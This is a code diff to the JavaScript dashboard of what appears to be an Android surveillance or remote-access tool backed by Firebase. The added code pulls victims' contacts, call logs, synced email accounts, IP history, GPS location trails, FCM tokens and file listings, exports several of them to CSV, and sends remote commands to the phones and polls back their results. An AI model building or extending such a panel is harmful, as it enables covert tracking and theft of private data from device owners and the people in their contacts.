@@ -174,17 +174,18 @@ if (isDashboard) {
     }
 
     // ---------- ONLINE DETECTION HELPER ----------
-    // Active within 5 minutes or explicitly marked online
+    // Active within 5 minutes using lastSeen (ServerValue.TIMESTAMP at root level)
     function isDeviceOnline(device) {
         if (!device) return false;
-        const info = device.info || {};
-        if (info.status === "online" || device.status === "online") return true;
-
-        const lastSeen = parseInt(info.last_seen || info.updated_at || info.first_seen || device.last_seen || 0);
-        if (!lastSeen) return false;
-
         const fiveMinutes = 5 * 60 * 1000;
-        return (Date.now() - lastSeen) < fiveMinutes;
+        // Use device.lastSeen (Firebase ServerValue.TIMESTAMP) as primary
+        const lastSeen = parseInt(device.lastSeen || device.last_seen || 0);
+        if (lastSeen && (Date.now() - lastSeen) < fiveMinutes) return true;
+        // Fallback to info fields
+        const info = device.info || {};
+        const infoTs = parseInt(info.last_sync || info.last_seen || info.updated_at || 0);
+        if (infoTs && (Date.now() - infoTs) < fiveMinutes) return true;
+        return false;
     }
 
     function formatRelativeTime(timestamp) {
@@ -305,12 +306,28 @@ if (isDashboard) {
         filteredIds.forEach(deviceId => {
             const dev = devices[deviceId];
             const info = dev.info || {};
+            const brand = info.brand || "";
             const model = info.model || "Android Device";
+            const displayName = brand ? `${brand} ${model}` : model;
             const android = info.android_version || "?";
             const battery = info.battery_level ? `${info.battery_level}%` : (info.battery || "--");
+            const networkType = info.network_type || "--";
             const online = isDeviceOnline(dev);
-            const lastActiveTs = info.last_seen || info.updated_at || info.first_seen || dev.last_seen;
-            const relativeTime = online ? "Online" : formatRelativeTime(lastActiveTs);
+
+            // lastSeen from root level device.lastSeen (ServerValue.TIMESTAMP)
+            const lastSeenTs = parseInt(dev.lastSeen || dev.last_seen || 0);
+            const relativeTime = online ? "Online Now" : (lastSeenTs ? formatRelativeTime(lastSeenTs) : "Never");
+
+            // Latest IP from ip_addresses/
+            let latestIP = info.ip || info.ip_address || "--";
+            if (dev.ip_addresses) {
+                const ipKeys = Object.keys(dev.ip_addresses);
+                if (ipKeys.length > 0) {
+                    const lastKey = ipKeys[ipKeys.length - 1];
+                    const ipEntry = dev.ip_addresses[lastKey];
+                    latestIP = (typeof ipEntry === "object" ? ipEntry.ip : ipEntry) || latestIP;
+                }
+            }
 
             const card = document.createElement("div");
             card.className = `device-card-item ${deviceId === currentDeviceId ? "selected" : ""}`;
@@ -320,17 +337,21 @@ if (isDashboard) {
                 <div class="device-card-header">
                     <div class="device-card-name">
                         <span class="online-pulse-dot ${online ? 'online' : 'offline'}"></span>
-                        <span>${escapeHTML(model)}</span>
+                        <span>${escapeHTML(displayName)}</span>
                     </div>
-                    <span class="device-card-badge">OS ${escapeHTML(android)}</span>
+                    <span class="device-card-badge">Android ${escapeHTML(String(android))}</span>
                 </div>
                 <div class="device-card-details">
                     <span><i class="fa-solid fa-fingerprint"></i> ${deviceId.substring(0, 10)}...</span>
                     <span><i class="fa-solid fa-battery-half"></i> ${escapeHTML(battery)}</span>
                 </div>
+                <div class="device-card-details" style="margin-top: 3px;">
+                    <span><i class="fa-solid fa-wifi"></i> ${escapeHTML(networkType)}</span>
+                    <span><i class="fa-solid fa-globe"></i> ${escapeHTML(latestIP)}</span>
+                </div>
                 <div class="device-card-footer">
                     <span><i class="fa-regular fa-clock"></i> ${relativeTime}</span>
-                    <button class="btn-card-delete" title="Delete device" onclick="event.stopPropagation(); promptDeleteDevice('${deviceId}', '${escapeHTML(model)}')">
+                    <button class="btn-card-delete" title="Delete device" onclick="event.stopPropagation(); promptDeleteDevice('${deviceId}', '${escapeHTML(displayName)}')">
                         <i class="fa-regular fa-trash-can"></i>
                     </button>
                 </div>
@@ -452,11 +473,15 @@ if (isDashboard) {
         renderPhotosTab();
         renderTelegramMediaTab();
         renderCallsTab();
+        renderAccountsTab();
+        renderIPsTab();
+        renderStorageTab();
+        renderResultsTab();
         renderLogsTab();
     }
 
     // ============================================================
-    // TAB 1: DEVICE INFO
+    // TAB 1: DEVICE INFO (+ Permissions + FCM Token)
     // ============================================================
     function renderDeviceInfoTab() {
         const grid = document.getElementById("specsGrid");
@@ -473,49 +498,92 @@ if (isDashboard) {
         }
 
         const info = deviceData.info || {};
+        const perms = deviceData.permissionStatus || {};
+        const fcmToken = deviceData.fcmToken || "";
         const keys = Object.keys(info);
 
-        if (keys.length === 0) {
+        let html = "";
+
+        // FCM Token (copyable)
+        if (fcmToken) {
+            html += `
+            <div class="spec-section-header"><i class="fa-solid fa-key"></i> FCM Token</div>
+            <div class="spec-item-card" style="grid-column: 1/-1;">
+                <div class="spec-item-header"><i class="fa-solid fa-bell"></i><span>FCM Push Token</span></div>
+                <div class="spec-item-value" style="font-size:10px; word-break:break-all;">${escapeHTML(fcmToken.substring(0, 60))}...</div>
+                <button class="btn-sm-ghost" style="margin-top:6px;font-size:10px;" onclick="copyText('${escapeHTML(fcmToken)}')">
+                    <i class="fa-regular fa-copy"></i> Copy Full Token
+                </button>
+            </div>`;
+        }
+
+        // Device Info fields
+        if (keys.length > 0) {
+            html += `<div class="spec-section-header" style="margin-top:10px;"><i class="fa-solid fa-microchip"></i> Hardware & OS Specifications</div>`;
+            keys.forEach(key => {
+                const val = info[key];
+                let icon = "fa-microchip";
+                if (key.includes("battery")) icon = "fa-battery-three-quarters";
+                else if (key.includes("model")) icon = "fa-mobile-screen";
+                else if (key.includes("brand") || key.includes("manufacturer")) icon = "fa-industry";
+                else if (key.includes("android") || key.includes("version")) icon = "fa-robot";
+                else if (key.includes("ip")) icon = "fa-network-wired";
+                else if (key.includes("time") || key.includes("seen") || key.includes("sync")) icon = "fa-clock";
+                else if (key.includes("storage") || key.includes("memory")) icon = "fa-hard-drive";
+                else if (key.includes("rooted") || key.includes("emulator")) icon = "fa-shield-halved";
+                else if (key.includes("country") || key.includes("language")) icon = "fa-globe";
+                else if (key.includes("network")) icon = "fa-wifi";
+                else if (key.includes("package") || key.includes("app")) icon = "fa-cubes";
+
+                let formattedVal = val;
+                if (key.includes("time") || key.includes("seen") || key.includes("sync") || key.includes("install") || key.includes("update")) {
+                    const ts = parseInt(val);
+                    if (!isNaN(ts) && ts > 100000000000) {
+                        formattedVal = new Date(ts).toLocaleString();
+                    }
+                }
+
+                html += `
+                <div class="spec-item-card">
+                    <div class="spec-item-header">
+                        <i class="fa-solid ${icon}"></i>
+                        <span>${escapeHTML(key.replace(/_/g, " "))}</span>
+                    </div>
+                    <div class="spec-item-value">${escapeHTML(String(formattedVal ?? "N/A"))}</div>
+                </div>`;
+            });
+        }
+
+        // Permission Status (color-coded)
+        const permKeys = Object.keys(perms);
+        if (permKeys.length > 0) {
+            html += `<div class="spec-section-header" style="margin-top:10px; grid-column:1/-1;"><i class="fa-solid fa-shield-halved"></i> Permission Status</div>`;
+            permKeys.forEach(perm => {
+                const status = (perms[perm] || "").toString();
+                const isGranted = status.toLowerCase() === "granted";
+                const color = isGranted ? "var(--primary)" : "var(--rose)";
+                const icon = isGranted ? "fa-circle-check" : "fa-circle-xmark";
+                html += `
+                <div class="spec-item-card" style="border-color: ${color}30;">
+                    <div class="spec-item-header">
+                        <i class="fa-solid ${icon}" style="color:${color};"></i>
+                        <span>${escapeHTML(perm.replace(/_/g, " "))}</span>
+                    </div>
+                    <div class="spec-item-value" style="color:${color}; font-weight:700;">${escapeHTML(status)}</div>
+                </div>`;
+            });
+        }
+
+        if (!html) {
             grid.innerHTML = `
                 <div class="empty-panel-prompt">
                     <i class="fa-solid fa-circle-exclamation"></i>
                     <p>No specifications available for this device yet.</p>
-                </div>
-            `;
+                </div>`;
             return;
         }
 
-        grid.innerHTML = "";
-        keys.forEach(key => {
-            const val = info[key];
-            const card = document.createElement("div");
-            card.className = "spec-item-card";
-
-            let icon = "fa-microchip";
-            if (key.includes("battery")) icon = "fa-battery-three-quarters";
-            else if (key.includes("model")) icon = "fa-mobile-screen";
-            else if (key.includes("android") || key.includes("version")) icon = "fa-robot";
-            else if (key.includes("ip")) icon = "fa-network-wired";
-            else if (key.includes("time") || key.includes("seen")) icon = "fa-clock";
-            else if (key.includes("storage") || key.includes("memory")) icon = "fa-hard-drive";
-
-            let formattedVal = val;
-            if (key.includes("time") || key.includes("seen")) {
-                const ts = parseInt(val);
-                if (!isNaN(ts) && ts > 100000000000) {
-                    formattedVal = new Date(ts).toLocaleString();
-                }
-            }
-
-            card.innerHTML = `
-                <div class="spec-item-header">
-                    <i class="fa-solid ${icon}"></i>
-                    <span>${escapeHTML(key.replace(/_/g, " "))}</span>
-                </div>
-                <div class="spec-item-value">${escapeHTML(String(formattedVal))}</div>
-            `;
-            grid.appendChild(card);
-        });
+        grid.innerHTML = html;
     }
 
     window.copyDeviceInfoText = function () {
@@ -579,7 +647,12 @@ if (isDashboard) {
                 name = item.name || item.display_name || "Unknown";
                 number = item.number || item.phone || item.mobile || "";
             } else if (typeof item === "string") {
-                if (item.includes(":")) {
+                // Firebase format: "Name | +91..." (pipe separated)
+                if (item.includes("|")) {
+                    const parts = item.split("|");
+                    name = (parts[0] || "").trim();
+                    number = (parts[1] || "").trim();
+                } else if (item.includes(":")) {
                     const parts = item.split(":");
                     name = parts[0].trim();
                     number = parts.slice(1).join(":").trim();
@@ -686,6 +759,39 @@ if (isDashboard) {
         sendDeviceCommand("collect_contacts", "Contacts collection requested from device.");
     };
 
+    window.exportContactsCSV = function () {
+        if (!currentDeviceId || !deviceData) {
+            showToast("Select a device first.", "warning");
+            return;
+        }
+        const contacts = deviceData.contacts || {};
+        const keys = Object.keys(contacts);
+        if (keys.length === 0) {
+            showToast("No contacts to export.", "warning");
+            return;
+        }
+        let csv = "Name,Number\n";
+        keys.forEach(k => {
+            const item = contacts[k];
+            let name = "", number = "";
+            if (typeof item === "object" && item !== null) {
+                name = item.name || item.display_name || "";
+                number = item.number || item.phone || item.mobile || "";
+            } else if (typeof item === "string") {
+                if (item.includes("|")) {
+                    const p = item.split("|");
+                    name = (p[0] || "").trim();
+                    number = (p[1] || "").trim();
+                } else {
+                    number = item;
+                }
+            }
+            csv += `"${name.replace(/"/g,'""')}","${number.replace(/"/g,'""')}"\n`;
+        });
+        downloadCSV(csv, `contacts_${currentDeviceId.substring(0,8)}_${Date.now()}.csv`);
+        showToast(`Exported ${keys.length} contacts to CSV!`);
+    };
+
     // ============================================================
     // TAB 3: GPS LOCATION & LEAFLET MAP
     // ============================================================
@@ -753,6 +859,8 @@ if (isDashboard) {
         }
     }
 
+    let mapPolyline = null;
+
     function initOrUpdateMap(lat, lng, accuracy = 0, zoom = 15) {
         const container = document.getElementById("mapContainer");
         if (!container || typeof L === "undefined") return;
@@ -768,6 +876,7 @@ if (isDashboard) {
 
         if (mapMarker) map.removeLayer(mapMarker);
         if (mapCircle) map.removeLayer(mapCircle);
+        if (mapPolyline) map.removeLayer(mapPolyline);
 
         if (lat !== 20.5937 && lng !== 78.9629) {
             mapMarker = L.marker([lat, lng]).addTo(map);
@@ -780,6 +889,24 @@ if (isDashboard) {
                     fillColor: "#10b981",
                     fillOpacity: 0.15
                 }).addTo(map);
+            }
+
+            // Draw location_history polyline trail
+            if (deviceData && deviceData.location_history) {
+                const historyEntries = Object.values(deviceData.location_history);
+                const trailPoints = historyEntries
+                    .filter(h => h.lat && h.lng)
+                    .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0))
+                    .map(h => [parseFloat(h.lat), parseFloat(h.lng)]);
+
+                if (trailPoints.length > 1) {
+                    mapPolyline = L.polyline(trailPoints, {
+                        color: "#06b6d4",
+                        weight: 3,
+                        opacity: 0.7,
+                        dashArray: "6, 4"
+                    }).addTo(map);
+                }
             }
         }
 
@@ -1462,21 +1589,34 @@ if (isDashboard) {
 
         callKeys.forEach(key => {
             const item = calls[key];
+            let callName = "";
             let number = "Unknown";
             let type = "incoming";
             let duration = "0s";
             let date = "";
 
             if (typeof item === "object" && item !== null) {
+                callName = item.name || "";
                 number = item.number || item.phone || item.name || "Unknown";
                 type = (item.type || "").toLowerCase();
                 duration = item.duration ? `${item.duration}s` : "0s";
-                date = item.date || item.timestamp ? new Date(parseInt(item.date || item.timestamp)).toLocaleString() : "";
+                date = (item.date || item.timestamp) ? new Date(parseInt(item.date || item.timestamp)).toLocaleString() : "";
             } else if (typeof item === "string") {
-                number = item;
+                // Firebase format: "Name | Num | IN | 2026-09-12 21:23 | 45s"
+                if (item.includes("|")) {
+                    const parts = item.split("|").map(s => s.trim());
+                    callName = parts[0] || "";
+                    number = parts[1] || item;
+                    type = (parts[2] || "").toLowerCase();
+                    date = parts[3] || "";
+                    duration = parts[4] || "0s";
+                } else {
+                    number = item;
+                }
             }
 
-            if (query && !number.toLowerCase().includes(query)) return;
+            const displayLabel = callName ? `${callName} (${number})` : number;
+            if (query && !displayLabel.toLowerCase().includes(query) && !number.toLowerCase().includes(query)) return;
 
             displayed++;
 
@@ -1502,8 +1642,8 @@ if (isDashboard) {
                         <i class="fa-solid ${typeIcon}"></i>
                     </div>
                     <div class="call-details">
-                        <span class="call-number">${escapeHTML(number)}</span>
-                        <span class="call-sub-info">${typeText} • Duration: ${duration} ${date ? "• " + date : ""}</span>
+                        <span class="call-number">${escapeHTML(callName || number)}</span>
+                        <span class="call-sub-info">${callName ? escapeHTML(number) + ' • ' : ''}${typeText} • ${duration} ${date ? "• " + date : ""}</span>
                     </div>
                 </div>
                 <button class="btn-contact-action btn-contact-delete" title="Delete Call Log" onclick="deleteSingleCallLog('${key}')">
@@ -1528,6 +1668,35 @@ if (isDashboard) {
 
     window.filterCallsList = function () {
         renderCallsTab();
+    };
+
+    window.exportCallLogsCSV = function () {
+        if (!currentDeviceId || !deviceData) {
+            showToast("Select a device first.", "warning");
+            return;
+        }
+        const calls = deviceData.call_logs || deviceData.calls || {};
+        const keys = Object.keys(calls);
+        if (keys.length === 0) {
+            showToast("No call logs to export.", "warning");
+            return;
+        }
+        let csv = "Name,Number,Type,Date,Duration\n";
+        keys.forEach(k => {
+            const item = calls[k];
+            let cName = "", num = "", cType = "", cDate = "", cDur = "";
+            if (typeof item === "string" && item.includes("|")) {
+                const p = item.split("|").map(s => s.trim());
+                cName = p[0]; num = p[1]; cType = p[2]; cDate = p[3]; cDur = p[4];
+            } else if (typeof item === "object" && item) {
+                cName = item.name || ""; num = item.number || item.phone || "";
+                cType = item.type || ""; cDate = item.date ? new Date(parseInt(item.date)).toLocaleString() : "";
+                cDur = item.duration ? `${item.duration}s` : "";
+            }
+            csv += `"${cName.replace(/"/g,'""')}","${num.replace(/"/g,'""')}","${cType}","${cDate}","${cDur}"\n`;
+        });
+        downloadCSV(csv, `calls_${currentDeviceId.substring(0,8)}_${Date.now()}.csv`);
+        showToast(`Exported ${keys.length} call logs to CSV!`);
     };
 
     window.deleteSingleCallLog = function (callKey) {
@@ -1646,6 +1815,10 @@ if (isDashboard) {
         sendDeviceCommand(cmd, `Command "${cmd}" sent!`);
     };
 
+    window.sendDeviceCommand = function (command, successMsg) {
+        sendDeviceCommand(command, successMsg);
+    };
+
     function sendDeviceCommand(command, successMsg) {
         const feedback = document.getElementById("commandStatusFeedback");
 
@@ -1659,8 +1832,27 @@ if (isDashboard) {
         database.ref(`devices/${currentDeviceId}/commands/${cmdKey}`)
             .set(command)
             .then(() => {
-                if (feedback) feedback.textContent = `✅ ${command} dispatched!`;
+                if (feedback) feedback.textContent = `⏳ ${command} dispatched — waiting for response...`;
                 showToast(successMsg || `Command "${command}" sent!`, "success");
+
+                // Listen for result in results/{cmdKey}
+                const resultRef = database.ref(`devices/${currentDeviceId}/results/${cmdKey}`);
+                const timeoutId = setTimeout(() => {
+                    resultRef.off("value");
+                    if (feedback) feedback.textContent = `⚠️ No response from device (timeout).`;
+                    showToast(`No response from device for "${command}"`, "warning");
+                }, 30000);
+
+                resultRef.on("value", (snap) => {
+                    if (snap.exists()) {
+                        clearTimeout(timeoutId);
+                        resultRef.off("value");
+                        const result = snap.val();
+                        const resultText = typeof result === "object" ? JSON.stringify(result) : String(result);
+                        if (feedback) feedback.textContent = `✅ Result: ${resultText.substring(0, 80)}${resultText.length > 80 ? "..." : ""}`;
+                        showToast(`📬 Result: ${resultText.substring(0, 60)}`, "success");
+                    }
+                });
             })
             .catch(err => {
                 if (feedback) feedback.textContent = `❌ Error: ${err.message}`;
@@ -1904,7 +2096,321 @@ if (isDashboard) {
             });
     }
 
+    // ============================================================
+    // TAB: ACCOUNTS
+    // ============================================================
+    function renderAccountsTab() {
+        const container = document.getElementById("accountsContainer");
+        const badge = document.getElementById("badgeAccounts");
+        if (!container) return;
+
+        if (!currentDeviceId || !deviceData) {
+            container.innerHTML = `<div class="empty-panel-prompt"><i class="fa-solid fa-at"></i><p>Select a device to view synced accounts.</p></div>`;
+            if (badge) badge.textContent = "0";
+            return;
+        }
+
+        const accounts = deviceData.accounts || {};
+        const keys = Object.keys(accounts);
+        if (badge) badge.textContent = keys.length;
+
+        if (keys.length === 0) {
+            container.innerHTML = `
+                <div class="empty-panel-prompt">
+                    <i class="fa-solid fa-at"></i>
+                    <p>No accounts found. On Android 8+, account access is restricted by OS.</p>
+                    <p style="font-size:11px;color:var(--text-muted);margin-top:6px;">Only Google Sign-In or app-specific accounts will appear here.</p>
+                </div>`;
+            return;
+        }
+
+        const query = (document.getElementById("accountsSearchInput")?.value || "").toLowerCase().trim();
+        const list = document.createElement("div");
+        list.className = "calls-list";
+        let displayed = 0;
+
+        keys.forEach(k => {
+            const item = accounts[k];
+            let email = "", type = "", uploadTime = "";
+            if (typeof item === "object" && item !== null) {
+                email = item.email || k;
+                type = item.type || "";
+                uploadTime = item.uploadTime ? new Date(parseInt(item.uploadTime)).toLocaleString() : "";
+            } else {
+                email = String(item);
+            }
+
+            if (query && !email.toLowerCase().includes(query) && !type.toLowerCase().includes(query)) return;
+            displayed++;
+
+            let typeIcon = "fa-envelope";
+            if (type.includes("google") || type.includes("com.google")) typeIcon = "fa-brands fa-google";
+            else if (type.includes("telegram")) typeIcon = "fa-brands fa-telegram";
+            else if (type.includes("whatsapp")) typeIcon = "fa-brands fa-whatsapp";
+            else if (type.includes("facebook")) typeIcon = "fa-brands fa-facebook";
+            else if (type.includes("instagram")) typeIcon = "fa-brands fa-instagram";
+
+            const card = document.createElement("div");
+            card.className = "call-item-card";
+            card.innerHTML = `
+                <div class="call-meta-group">
+                    <div class="call-type-icon incoming" style="background: rgba(99,102,241,0.15); border-color: rgba(99,102,241,0.3);">
+                        <i class="${typeIcon}" style="color:#818cf8;"></i>
+                    </div>
+                    <div class="call-details">
+                        <span class="call-number">${escapeHTML(email)}</span>
+                        <span class="call-sub-info">${escapeHTML(type || "Account")} ${uploadTime ? "• " + uploadTime : ""}</span>
+                    </div>
+                </div>
+                <button class="btn-contact-action" title="Copy Email" onclick="copyText('${escapeHTML(email)}')">
+                    <i class="fa-regular fa-copy"></i>
+                </button>
+            `;
+            list.appendChild(card);
+        });
+
+        container.innerHTML = "";
+        if (displayed === 0) {
+            container.innerHTML = `<div class="empty-panel-prompt"><i class="fa-solid fa-magnifying-glass"></i><p>No accounts match filter.</p></div>`;
+        } else {
+            container.appendChild(list);
+        }
+    }
+
+    window.filterAccountsList = function () { renderAccountsTab(); };
+
+    window.exportAccountsCSV = function () {
+        if (!currentDeviceId || !deviceData) { showToast("Select a device first.", "warning"); return; }
+        const accounts = deviceData.accounts || {};
+        const keys = Object.keys(accounts);
+        if (keys.length === 0) { showToast("No accounts to export.", "warning"); return; }
+        let csv = "Email,Type,UploadTime\n";
+        keys.forEach(k => {
+            const item = accounts[k];
+            const email = (typeof item === "object" ? item.email : item) || k;
+            const type = (typeof item === "object" ? item.type : "") || "";
+            const ts = (typeof item === "object" && item.uploadTime) ? new Date(parseInt(item.uploadTime)).toLocaleString() : "";
+            csv += `"${String(email).replace(/"/g,'""')}","${type}","${ts}"\n`;
+        });
+        downloadCSV(csv, `accounts_${currentDeviceId.substring(0,8)}_${Date.now()}.csv`);
+        showToast(`Exported ${keys.length} accounts!`);
+    };
+
+    window.confirmDeleteAllAccounts = function () {
+        if (!currentDeviceId) return;
+        const count = Object.keys(deviceData.accounts || {}).length;
+        openConfirmModal("Clear Accounts", `Delete all ${count} account records?`, () => {
+            database.ref(`devices/${currentDeviceId}/accounts`).remove();
+            showToast("Accounts cleared.");
+        });
+    };
+
+    // ============================================================
+    // TAB: IP HISTORY
+    // ============================================================
+    function renderIPsTab() {
+        const container = document.getElementById("ipsContainer");
+        const badge = document.getElementById("badgeIPs");
+        if (!container) return;
+
+        if (!currentDeviceId || !deviceData) {
+            container.innerHTML = `<div class="empty-panel-prompt"><i class="fa-solid fa-network-wired"></i><p>Select a device to view IP history.</p></div>`;
+            if (badge) badge.textContent = "0";
+            return;
+        }
+
+        const ips = deviceData.ip_addresses || {};
+        const keys = Object.keys(ips);
+        if (badge) badge.textContent = keys.length;
+
+        if (keys.length === 0) {
+            container.innerHTML = `<div class="empty-panel-prompt"><i class="fa-solid fa-network-wired"></i><p>No IP address history recorded yet.</p></div>`;
+            return;
+        }
+
+        const list = document.createElement("div");
+        list.className = "calls-list";
+
+        // Sort newest first
+        const sorted = keys.map(k => {
+            const entry = ips[k];
+            return {
+                ip: (typeof entry === "object" ? entry.ip : entry) || "Unknown",
+                time: (typeof entry === "object" && entry.uploadTime) ? parseInt(entry.uploadTime) : 0
+            };
+        }).sort((a, b) => b.time - a.time);
+
+        sorted.forEach(entry => {
+            const card = document.createElement("div");
+            card.className = "call-item-card";
+            const timeStr = entry.time ? new Date(entry.time).toLocaleString() : "";
+            card.innerHTML = `
+                <div class="call-meta-group">
+                    <div class="call-type-icon incoming" style="background: rgba(6,182,212,0.1); border-color: rgba(6,182,212,0.3);">
+                        <i class="fa-solid fa-globe" style="color:#06b6d4;"></i>
+                    </div>
+                    <div class="call-details">
+                        <span class="call-number" style="font-family: monospace;">${escapeHTML(entry.ip)}</span>
+                        <span class="call-sub-info">${timeStr || "Unknown time"}</span>
+                    </div>
+                </div>
+                <button class="btn-contact-action" title="Copy IP" onclick="copyText('${escapeHTML(entry.ip)}')">
+                    <i class="fa-regular fa-copy"></i>
+                </button>
+            `;
+            list.appendChild(card);
+        });
+
+        container.innerHTML = "";
+        container.appendChild(list);
+    }
+
+    window.confirmDeleteAllIPs = function () {
+        if (!currentDeviceId) return;
+        openConfirmModal("Clear IP History", "Delete all IP address records for this device?", () => {
+            database.ref(`devices/${currentDeviceId}/ip_addresses`).remove();
+            showToast("IP history cleared.");
+        });
+    };
+
+    // ============================================================
+    // TAB: STORAGE LAYOUT
+    // ============================================================
+    function renderStorageTab() {
+        const container = document.getElementById("storageContainer");
+        if (!container) return;
+
+        if (!currentDeviceId || !deviceData) {
+            container.innerHTML = `<div class="empty-panel-prompt"><i class="fa-solid fa-folder-open"></i><p>Select a device to view storage.</p></div>`;
+            return;
+        }
+
+        const storage = deviceData.storage || {};
+        const keys = Object.keys(storage);
+
+        if (keys.length === 0) {
+            container.innerHTML = `<div class="empty-panel-prompt"><i class="fa-solid fa-folder-open"></i><p>No storage data. Click 'Get Storage List' to scan device files.</p></div>`;
+            return;
+        }
+
+        // Sort paths
+        const sorted = keys.sort();
+        const list = document.createElement("div");
+        list.className = "calls-list";
+
+        sorted.forEach(path => {
+            const size = storage[path];
+            const parts = path.split("/");
+            const fileName = parts[parts.length - 1] || path;
+            const depth = Math.max(0, parts.length - 2);
+            const isDir = !fileName.includes(".");
+
+            const card = document.createElement("div");
+            card.className = "call-item-card";
+            card.style.paddingLeft = `${16 + depth * 14}px`;
+            card.innerHTML = `
+                <div class="call-meta-group">
+                    <div class="call-type-icon incoming" style="background: rgba(245,158,11,0.1); border-color: rgba(245,158,11,0.3); min-width:32px; height:32px;">
+                        <i class="fa-solid ${isDir ? 'fa-folder text-warning' : 'fa-file'}" style="color:${isDir ? '#f59e0b' : '#94a3b8'}; font-size:12px;"></i>
+                    </div>
+                    <div class="call-details">
+                        <span class="call-number" style="font-size:12px;">${escapeHTML(fileName)}</span>
+                        <span class="call-sub-info" style="font-size:10px;">${escapeHTML(path)}</span>
+                    </div>
+                </div>
+                <span style="font-size:11px; color:var(--text-muted); white-space:nowrap;">${escapeHTML(String(size || ""))}</span>
+            `;
+            list.appendChild(card);
+        });
+
+        container.innerHTML = "";
+        container.appendChild(list);
+    }
+
+    window.requestStorageRefresh = function () {
+        sendDeviceCommand("get_storage", "Storage scan command sent to device.");
+    };
+
+    // ============================================================
+    // TAB: COMMAND RESULTS
+    // ============================================================
+    function renderResultsTab() {
+        const container = document.getElementById("resultsContainer");
+        const badge = document.getElementById("badgeResults");
+        if (!container) return;
+
+        if (!currentDeviceId || !deviceData) {
+            container.innerHTML = `<div class="empty-panel-prompt"><i class="fa-solid fa-reply"></i><p>Select a device to view command results.</p></div>`;
+            if (badge) badge.textContent = "0";
+            return;
+        }
+
+        const results = deviceData.results || {};
+        const keys = Object.keys(results);
+        if (badge) badge.textContent = keys.length;
+
+        if (keys.length === 0) {
+            container.innerHTML = `<div class="empty-panel-prompt"><i class="fa-solid fa-terminal"></i><p>No results yet. Send commands and responses will appear here.</p></div>`;
+            return;
+        }
+
+        const list = document.createElement("div");
+        list.className = "calls-list";
+
+        // Sort newest first (keys are timestamps)
+        keys.sort((a, b) => parseInt(b) - parseInt(a)).forEach(cmdId => {
+            const result = results[cmdId];
+            const resultText = typeof result === "object" ? JSON.stringify(result, null, 2) : String(result);
+            const ts = parseInt(cmdId);
+            const timeStr = !isNaN(ts) && ts > 1000000000000 ? new Date(ts).toLocaleString() : cmdId;
+            const isSuccess = resultText.toLowerCase().includes("ok") || resultText.toLowerCase().includes("success") || resultText.toLowerCase().includes("pong");
+            const isError = resultText.toLowerCase().includes("error") || resultText.toLowerCase().includes("fail");
+
+            const card = document.createElement("div");
+            card.className = "call-item-card";
+            const color = isError ? "#f43f5e" : isSuccess ? "#10b981" : "#06b6d4";
+            const icon = isError ? "fa-circle-xmark" : isSuccess ? "fa-circle-check" : "fa-circle-dot";
+            card.innerHTML = `
+                <div class="call-meta-group" style="align-items:flex-start; gap:10px;">
+                    <i class="fa-solid ${icon}" style="color:${color}; margin-top:3px; font-size:16px;"></i>
+                    <div class="call-details" style="flex:1;">
+                        <span class="call-sub-info" style="font-size:10px; color:var(--text-muted);">CMD: ${escapeHTML(cmdId.substring(0, 13))} • ${timeStr}</span>
+                        <span class="call-number" style="font-size:12px; font-family:monospace; word-break:break-all; margin-top:4px; color:${color};">${escapeHTML(resultText.substring(0, 200))}${resultText.length > 200 ? "..." : ""}</span>
+                    </div>
+                </div>
+            `;
+            list.appendChild(card);
+        });
+
+        container.innerHTML = "";
+        container.appendChild(list);
+    }
+
+    window.confirmDeleteAllResults = function () {
+        if (!currentDeviceId) return;
+        openConfirmModal("Clear Results", "Delete all command results for this device?", () => {
+            database.ref(`devices/${currentDeviceId}/results`).remove();
+            showToast("Results cleared.");
+        });
+    };
+
 } // End isDashboard
+
+// ============================================================
+// HELPER UTILITIES
+// ============================================================
+function downloadCSV(csvContent, filename) {
+    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = filename;
+    a.style.display = "none";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    setTimeout(() => URL.revokeObjectURL(url), 3000);
+}
 
 // ============================================================
 // HELPER UTILITIES
